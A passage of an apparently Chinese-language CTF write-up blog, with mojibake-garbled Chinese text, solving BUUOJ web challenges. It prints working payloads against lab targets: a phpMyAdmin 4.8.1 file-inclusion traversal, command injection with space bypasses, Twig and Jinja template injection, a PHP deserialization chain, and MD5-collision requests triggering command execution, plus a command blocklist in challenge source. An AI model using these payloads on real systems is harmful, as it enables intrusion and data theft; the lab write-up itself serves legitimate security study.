</code></pre><p>æŸ¥è¯¢åˆ°<code>4.8.1</code>ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼š[phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2018-12613ï¼‰](<a href=https://www.abelche.com/2019/11/16/CVE/phpmyadmin>https://www.abelche.com/2019/11/16/CVE/phpmyadmin</a> 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2018-12613ï¼‰/)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://c09e4207-6d8b-462c-ab7e-4c7fa1e59dfc.node5.buuoj.cn:81/phpmyadmin/index.php?target<span style=color:#f92672>=</span>db_sql.php%253f/../../../../../../../../flag
</span></span></code></pre></div><h2 id=bjdctf2020mark-loves-cat>[BJDCTF2020]Mark loves cat</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$yds <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;dog&#34;</span>;
</span></span><span style=display:flex><span>$is <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;cat&#34;</span>;
</span></span><span style=display:flex><span>$handsome <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;yds&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_POST <span style=color:#66d9ef>as</span> $x <span style=color:#f92672>=&gt;</span> $y){ã€€ã€€ã€€ã€€
</span></span><span style=display:flex><span>    $$x <span style=color:#f92672>=</span> $y  ;  <span style=color:#75715e>//post å£°æ˜è‡³å½“å‰æ–‡ä»¶
</span></span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $x <span style=color:#f92672>=&gt;</span> $y){ã€€ã€€ã€€ 
</span></span><span style=display:flex><span>    $$x <span style=color:#f92672>=</span> $$y;  <span style=color:#75715e>//GETå‹å˜é‡é‡æ–°èµ‹å€¼ä¸ºå½“å‰æ–‡ä»¶å˜é‡ä¸­ä»¥å…¶å€¼ä¸ºé”®åçš„å€¼
</span></span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $x <span style=color:#f92672>=&gt;</span> $y){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($_GET[<span style=color:#e6db74>&#39;flag&#39;</span>] <span style=color:#f92672>===</span> $x <span style=color:#f92672>&amp;&amp;</span> $x <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;flag&#39;</span>){ã€€ <span style=color:#75715e>//ä¼ å…¥çš„å˜é‡ä¸ºflag   valueä¸æ˜¯flag
</span></span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>($handsome);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;flag&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;flag&#39;</span>])){  
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>($yds);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;flag&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;flag&#39;</span>  <span style=color:#f92672>||</span> $_GET[<span style=color:#e6db74>&#39;flag&#39;</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;flag&#39;</span>){   
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>($is);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;the flag is: &#34;</span><span style=color:#f92672>.</span>$flag;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://6e2a4e1e-f07f-4efe-9ac3-3ee42db544de.node5.buuoj.cn:81/?yds<span style=color:#f92672>=</span>flag
</span></span></code></pre></div><h2 id=wustctf2020æœ´å®æ— å>[WUSTCTF2020]æœ´å®æ— å</h2><p>çœ‹robots</p><pre tabindex=0><code>GET /fAke_f1agggg.php HTTP/1.1
Host: 36627a2d-0bd3-4b95-a5f3-c38ccccd1864.node5.buuoj.cn:81
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Referer: http://36627a2d-0bd3-4b95-a5f3-c38ccccd1864.node5.buuoj.cn:81/
Accept-Encoding: gzip, deflate

HTTP/1.1 200 OK
Server: openresty
Date: Mon, 17 Feb 2025 14:18:02 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.5.38
look_at_me: /fl4g.php
Cache-Control: no-cache
Content-Length: 22

flag{this_is_not_flag}
</code></pre><pre tabindex=0><code>&lt;?php
header(&#39;Content-type:text/html;charset=utf-8&#39;);
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET[&#39;num&#39;])){
    $num = $_GET[&#39;num&#39;];
    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){
        echo &#34;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&#34;;
    }else{
        die(&#34;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&#34;);
    }
}else{
    die(&#34;å»éæ´²å§&#34;);
}
//level 2
if (isset($_GET[&#39;md5&#39;])){
   $md5=$_GET[&#39;md5&#39;];
   if ($md5==md5($md5))
       echo &#34;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&#34;;
   else
       die(&#34;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&#34;);
}else{
    die(&#34;å»éæ´²å§&#34;);
}

//get flag
if (isset($_GET[&#39;get_flag&#39;])){
    $get_flag = $_GET[&#39;get_flag&#39;];
    if(!strstr($get_flag,&#34; &#34;)){
        $get_flag = str_ireplace(&#34;cat&#34;, &#34;wctf2020&#34;, $get_flag);
        echo &#34;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&#34;;
        system($get_flag);
    }else{
        die(&#34;å¿«åˆ°éæ´²äº†&#34;);
    }
}else{
    die(&#34;å»éæ´²å§&#34;);
}
?&gt;
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /fl4g.php?num<span style=color:#f92672>=</span>2019e3&amp;md5<span style=color:#f92672>=</span>0e215962017&amp;get_flag<span style=color:#f92672>=</span>tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag  HTTP/1.1
</span></span><span style=display:flex><span>Host: 36627a2d-0bd3-4b95-a5f3-c38ccccd1864.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Referer: http://36627a2d-0bd3-4b95-a5f3-c38ccccd1864.node5.buuoj.cn:81/
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span></code></pre></div><p>è€ƒç‚¹æˆ‘æ„Ÿè§‰æœ€é‡è¦çš„å…¶å®æ˜¯ç©ºæ ¼çš„ç»•è¿‡</p><h2 id=bjdctf2020cookie-is-so-stable>[BJDCTF2020]Cookie is so stable</h2><pre tabindex=0><code>{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;cat /flag&#34;)}}
</code></pre><p>twigæ³¨å…¥,åœ¨cookieå¤„å†™å…¥</p><h2 id=mrctf2020ezpop>[MRCTF2020]Ezpop</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Modifier</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span>  $var<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>append</span>($value){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>include</span>($value);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>append</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>var</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $source;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($file<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;index.php&#39;</span>){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Welcome to &#39;</span><span style=color:#f92672>.</span>$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>(){
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $p;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>(){
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($key){
</span></span><span style=display:flex><span>        $function <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $function();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>show</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>p</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Modifier</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($exp));
</span></span></code></pre></div><h2 id=å®‰æ´µæ¯-2019easy_web>[å®‰æ´µæ¯ 2019]easy_web</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#66d9ef>E_ALL</span> <span style=color:#f92672>||</span> <span style=color:#f92672>~</span> <span style=color:#a6e22e>E_NOTICE</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;content-type:text/html;charset=utf-8&#39;</span>);
</span></span><span style=display:flex><span>$cmd <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;img&#39;</span>]) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>])) 
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;</span>);
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#a6e22e>hex2bin</span>(<span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>base64_decode</span>($_GET[<span style=color:#e6db74>&#39;img&#39;</span>])));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>(<span style=color:#e6db74>&#34;/[^a-zA-Z0-9.]+/&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>, $file);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/flag/i&#34;</span>, $file)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;xixiï½ no flag&#34;</span>);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    $txt <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($file));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span> <span style=color:#f92672>.</span> $txt <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;&#39;&gt;&lt;/img&gt;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $cmd;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>|\`|;|,|\*|\?|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\t</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\r</span><span style=color:#e6db74>|</span><span style=color:#ae81ff>\xA0</span><span style=color:#e6db74>|\{|\}|\(|\)|\&amp;[^\d]|@|\||</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;</span>, $cmd)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#34;forbid ~&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ((<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;a&#39;</span>] <span style=color:#f92672>!==</span> (<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;b&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;a&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($_POST[<span style=color:#e6db74>&#39;b&#39;</span>])) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>`$cmd`</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> (<span style=color:#e6db74>&#34;md5 is funny ~&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /index.php?cmd<span style=color:#f92672>=</span>ca<span style=color:#ae81ff>\t</span>%20/<span style=color:#ae81ff>\f\l\a\g</span>&amp;img<span style=color:#f92672>=</span>qwe HTTP/1.1
</span></span><span style=display:flex><span>Host: df3c93c8-9d3d-4d3c-b2aa-926b38c6294c.node5.buuoj.cn:81
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>41</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>a<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;b<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></div><h2 id=mrctf2020pywebsite>[MRCTF2020]PYWebsite</h2><pre tabindex=0><code>http://node5.buuoj.cn:26585/flag.php
xff:127.0.0.1
</code></pre><h2 id=westernctf2018shrine>[WesternCTF2018]shrine</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> flask
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;FLAG&#39;</span>] <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>pop(<span style=color:#e6db74>&#39;FLAG&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open(__file__)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/shrine/&lt;path:shrine&gt;&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>shrine</span>(shrine):
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>safe_jinja</span>(s):
</span></span><span style=display:flex><span>        s <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;(&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;)&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>        blacklist <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;config&#39;</span>, <span style=color:#e6db74>&#39;self&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>format(c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> blacklist]) <span style=color:#f92672>+</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template_string(safe_jinja(shrine))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(debug<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://ecf1c5a2-9330-4d7d-9475-4924e6ff3870.node5.buuoj.cn:81/shrine/<span style=color:#f92672>{{</span>url_for.__globals__<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;current_app&#39;</span><span style=color:#f92672>]</span>.config<span style=color:#f92672>}}</span>
</span></span></code></pre></div><h2 id=å®‰æ´µæ¯-2019easy_serialize_php>[å®‰æ´µæ¯ 2019]easy_serialize_php</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$function <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;f&#39;</span>];
</span></span><span style=display:flex><span>
